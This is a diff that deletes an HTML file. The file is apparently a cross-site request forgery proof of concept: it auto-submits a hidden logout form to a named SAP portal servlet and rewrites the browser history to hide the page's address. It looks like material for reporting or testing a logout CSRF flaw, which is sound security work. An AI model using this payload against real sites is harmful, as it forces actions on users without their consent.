@@ -1,13 +1,1 @@
-<html>
-  <body>
-  <script>history.pushState('', '', '/')</script>
-    <form action="https://testportal.zalaris.com/irj/servlet/prt/portal/prtroot/com.sap.portal.navigation.masthead.LogOutComponent">
-      <input type="hidden" name="logout&#95;submit" value="true" />
-      <input type="submit" value="Submit request" />
-    </form>
-    <script>
-      document.forms[0].submit();
-    </script>
-  </body>
-</html>
 
